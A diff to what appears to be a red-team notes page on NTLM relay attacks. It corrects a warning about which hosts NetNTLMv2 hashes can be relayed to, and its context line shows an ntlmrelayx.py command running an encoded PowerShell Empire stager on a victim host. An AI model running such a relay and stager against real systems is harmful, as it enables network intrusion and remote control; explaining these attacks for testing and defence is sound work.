@@ -43,7 +43,7 @@ ntlmrelayx.py -t 10.0.0.2 -c 'powershell -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVg
 nltmrelay.py will be listening for any relayed NetNTLMv2 hashes and will forward them to a victim2 system \(-t 10.0.0.2\). On successful authentication, a command \(specified with -c powershell... - which is our Empire stager\) will be exeucted on victim2. 
 
 {% hint style="warning" %}
-Note that the NetNTLMv2 hashes can only be relayed to the same host they are originating from. You can, however, try cracking them offline and use them on the machine they originated from.
+Note that the NetNTLMv2 hashes cannot be relayed to the same host they are originating from. You can, however, try cracking them offline and use them on the machine they originated from.
 {% endhint %}
 
 Below shows the entire attack in an animated gif:
